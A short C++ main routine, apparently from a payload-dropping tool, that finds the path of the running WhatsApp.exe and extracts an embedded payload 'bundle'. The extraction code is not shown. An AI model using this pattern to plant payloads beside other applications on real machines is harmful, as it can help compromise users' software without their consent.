#include "utils/process.h"
#include "core/bundle.h"
#include <synchapi.h>
#include <filesystem>

int main() {
    int ret;
    std::unique_ptr<bundle> targetPayload;
    auto targetPathStr = new CHAR [MAX_PATH];
    std::string targetProcess("WhatsApp.exe");

    ret = ProcessUtils::FindProcessExecutable(targetProcess.c_str(), targetPathStr);

    std::filesystem::path targetPath(targetPathStr);
    // Cleanup C-style
    delete[] targetPathStr;

    if (ret != 0) {
        std::cerr << "[!] Could not find target process => ";
        return -1;
    }

    targetPayload = bundle::findBundle();
    if (targetPayload) {
        std::cout << "[+] Obtained bundle." <<  std::endl;
        // Testing: Uncomment to print bundle contents to console.
        // std::cout << targetPayload->getPayloadAddress() << std::endl;
    } else {
        std::cerr << "[!] No Payload. Exiting." << std::endl;
        return -1;
    }

    bundle::extractPayload(targetPayload);

    return 0;
}